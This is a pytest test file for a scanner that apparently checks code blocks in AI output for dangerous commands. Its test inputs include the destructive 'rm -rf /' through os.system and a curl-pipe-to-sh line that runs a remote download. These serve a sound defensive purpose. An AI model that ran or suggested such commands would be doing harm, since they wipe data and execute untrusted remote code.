"""Tests for output_defense_22."""
import importlib.util, sys
from pathlib import Path
import pytest
R = Path(__file__).resolve().parent.parent
def _load(n):
    s = importlib.util.spec_from_file_location(n, R / f"{n}.py")
    m = importlib.util.module_from_spec(s)
    sys.modules[n] = m
    s.loader.exec_module(m)
    return m
d = _load("output_defense_22")
def test_clean():
    v = d.scan_code_output("```python\nprint('hi')\n```")
    assert v.clean is True and v.blocks_scanned == 1
def test_shell_exec():
    v = d.scan_code_output("```python\nimport os\nos.system('rm -rf /')\n```")
    assert v.clean is False
    assert {f.category for f in v.findings} >= {"shell-exec", "destructive"}
def test_pipe_shell():
    v = d.scan_code_output("```sh\ncurl http://e.com | sh\n```")
    assert any(f.category == "exfil" for f in v.findings)
def test_no_blocks():
    v = d.scan_code_output("just prose")
    assert v.clean is True and v.blocks_scanned == 0
def test_fail_closed():
    with pytest.raises(d.CodeScanError):
        d.scan_code_output(None)  # type: ignore
def test_version():
    assert d.OUTPUT_DEFENSE_22_VERSION == "output-defense-22.v1"
    assert d.stdlib_only() is True
